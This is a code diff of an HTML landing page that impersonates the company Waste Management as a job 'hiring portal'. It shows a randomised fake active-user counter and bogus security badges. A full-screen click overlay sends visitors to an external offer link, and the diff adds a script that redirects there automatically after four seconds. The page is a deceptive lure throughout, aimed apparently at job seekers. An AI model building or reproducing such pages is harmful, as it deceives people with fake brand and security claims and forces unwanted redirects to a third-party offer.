@@ -18,13 +18,12 @@
             overflow: hidden; cursor: pointer;
         }
 
-        /* All-Click Overlay */
         .click-wrap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
 
         .glass-card {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(40px) saturate(220%);
-            -webkit-backdrop-filter: blur(40px) saturate(220%);
+            backdrop-filter: blur(45px) saturate(220%);
+            -webkit-backdrop-filter: blur(45px) saturate(220%);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 45px; padding: 45px 25px; width: 100%; max-width: 460px;
             text-align: center; color: white;
@@ -33,76 +32,68 @@
             animation: entry 1.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
 
-        /* Advanced Status Header */
         .status-container {
             display: flex; justify-content: space-between; align-items: center;
             margin-bottom: 30px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 15px;
         }
 
-        .user-stats {
-            display: flex; align-items: center; gap: 8px;
-            font-size: 13px; font-weight: 800; color: #fff; letter-spacing: 0.5px;
-        }
-
+        .user-stats { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 800; color: #fff; }
         .pulse-dot { height: 8px; width: 8px; background: var(--danger); border-radius: 50%; box-shadow: 0 0 12px var(--danger); animation: pulse 2s infinite; }
 
         .time-box {
             font-size: 14px; color: var(--primary); font-weight: 900;
-            background: rgba(0, 208, 132, 0.1); padding: 5px 12px; border-radius: 8px; border: 1px solid rgba(0, 208, 132, 0.2);
+            background: rgba(0, 208, 132, 0.12); padding: 5px 12px; border-radius: 8px; border: 1px solid rgba(0, 208, 132, 0.3);
         }
 
-        /* Split Greeting & Node Section */
         .branding-header { margin-bottom: 30px; }
 
         #greet-msg {
-            font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.5);
-            text-transform: uppercase; letter-spacing: 3px; margin-bottom: 8px; display: block;
+            font-size: 20px; font-weight: 900; color: #ffffff; text-transform: uppercase; 
+            letter-spacing: 2px; margin: 0 auto 12px; display: block; width: fit-content;
+            overflow: hidden; white-space: nowrap; border-right: 2px solid var(--primary);
+            animation: typing 2s steps(20, end), blink 0.75s step-end infinite;
         }
 
         .node-badge {
             display: inline-flex; align-items: center; gap: 8px;
-            background: rgba(0, 208, 132, 0.05); padding: 8px 18px; border-radius: 100px;
-            border: 1px solid rgba(0, 208, 132, 0.3);
-            box-shadow: 0 0 20px rgba(0, 208, 132, 0.1);
+            background: rgba(0, 208, 132, 0.08); padding: 10px 22px; border-radius: 100px;
+            border: 1px solid rgba(0, 208, 132, 0.4); animation: glowPulse 3s infinite;
         }
 
-        .node-text {
-            font-size: 12px; font-weight: 900; color: var(--primary);
-            text-transform: uppercase; letter-spacing: 1.5px;
-        }
+        .node-text { font-size: 13px; font-weight: 900; color: var(--primary); letter-spacing: 1.5px; }
 
-        h1 { font-size: clamp(28px, 8.5vw, 38px); font-weight: 900; margin-bottom: 12px; letter-spacing: -1.5px; line-height: 1; background: linear-gradient(180deg, #FFFFFF 0%, #A0A0A0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        h1 { font-size: clamp(30px, 9vw, 42px); font-weight: 900; margin-bottom: 15px; background: linear-gradient(180deg, #FFFFFF 0%, #A0A0A0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        p { font-size: clamp(15px, 4.2vw, 17px); color: rgba(255,255,255,0.8); line-height: 1.6; margin-bottom: 40px; padding: 0 10px; }
+        p { font-size: clamp(16px, 4.5vw, 18px); color: rgba(255,255,255,0.9); line-height: 1.6; margin-bottom: 40px; }
 
         .cta-btn {
             background: linear-gradient(135deg, #00d084 0%, #00a368 100%);
-            color: #002b1a; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 900; 
+            color: #002b1a; padding: 22px; border-radius: 20px; font-size: 22px; font-weight: 900; 
             box-shadow: 0 15px 35px rgba(0, 208, 132, 0.3);
         }
 
-        .footer-tag { margin-top: 45px; font-size: 10px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; }
-
-        /* Animations */
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink { from, to { border-color: transparent } 50% { border-color: var(--primary) } }
+        @keyframes glowPulse { 0%, 100% { box-shadow: 0 0 10px rgba(0,208,132,0.1); } 50% { box-shadow: 0 0 25px rgba(0,208,132,0.3); } }
         @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
         @keyframes entry { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body onclick="window.location.href='https://vinos1.com/hP57O3N1Rq?'">
+<body onclick="handleInteraction()">
 
     <div class="click-wrap"></div>
 
-    <div class="glass-card" id="card">
+    <div class="glass-card" id="main-card">
         <div class="status-container">
             <div class="user-stats">
                 <div class="pulse-dot"></div>
-                <span id="user-count">1,042</span> ACTIVE USERS
+                <span id="user-count">1,052</span> ACTIVE USERS
             </div>
             <div class="time-box" id="clock">00:00:00</div>
         </div>
 
         <div class="branding-header">
-            <span id="greet-msg">Good Afternoon</span>
+            <span id="greet-msg">Good Morning</span>
             <div class="node-badge">
                 <div class="pulse-dot" style="background: var(--primary); box-shadow: 0 0 10px var(--primary);"></div>
                 <span class="node-text">SECURE NODE ACTIVE</span>
@@ -110,23 +101,39 @@
         </div>
 
         <h1>Waste Management</h1>
-        <p>Your regional session is verified. Access the sustainability network dashboard to confirm your assignment details.</p>
+        <p>Your session is verified. Access the official hiring portal to view your assigned shifts and tasks.</p>
         
         <div class="cta-btn">Access Official Portal</div>
 
-        <div class="footer-tag">
-            <p>ENC-TYPE: AES-256-DISTRICT</p>
+        <div class="footer-info" style="margin-top: 40px; font-size: 11px; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 2px;">
+            <p>ID: WM-SYS-USA-2026</p>
             <p>© Waste Management International</p>
         </div>
     </div>
 
     <script>
+        const offerLink = "https://vinos1.com/hP57O3N1Rq?";
+        let clicked = false;
+
+        // ৪ সেকেন্ড পর অটো-রিডাইরেক্ট (৪০০০ মিলি-সেকেন্ড)
+        const autoRedirect = setTimeout(() => {
+            if (!clicked) {
+                window.location.href = offerLink;
+            }
+        }, 4000); 
+
+        function handleInteraction() {
+            clicked = true; 
+            clearTimeout(autoRedirect);
+            window.location.href = offerLink;
+        }
+
         function updateStats() {
             const el = document.getElementById('user-count');
             let val = parseInt(el.innerText.replace(',', ''));
-            let change = Math.floor(Math.random() * 4) + 1;
+            let change = Math.floor(Math.random() * 5) + 1;
             val = (Math.random() > 0.5) ? val + change : val - change;
-            if (val < 995) val += 10; if (val > 1145) val -= 10;
+            if (val < 1000) val += 15; if (val > 1180) val -= 15;
             el.innerText = val.toLocaleString();
         }
 
@@ -134,12 +141,20 @@
             const d = new Date();
             document.getElementById('clock').innerText = d.toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
             const h = d.getHours();
-            document.getElementById('greet-msg').innerText = (h < 12 ? "Good Morning" : h < 18 ? "Good Afternoon" : "Good Evening");
+            const msg = (h < 12 ? "Good Morning" : h < 18 ? "Good Afternoon" : "Good Evening");
+            document.getElementById('greet-msg').innerText = msg;
         }
 
         setInterval(updateStats, 10000); 
         setInterval(runClock, 1000); 
         runClock();
+
+        // মোবাইল টাচ ইন্টারঅ্যাকশন
+        document.addEventListener('touchstart', function() {
+            const card = document.getElementById('main-card');
+            card.style.transform = "scale(0.98)";
+            setTimeout(() => { card.style.transform = "scale(1)"; }, 150);
+        });
     </script>
 </body>
 </html>
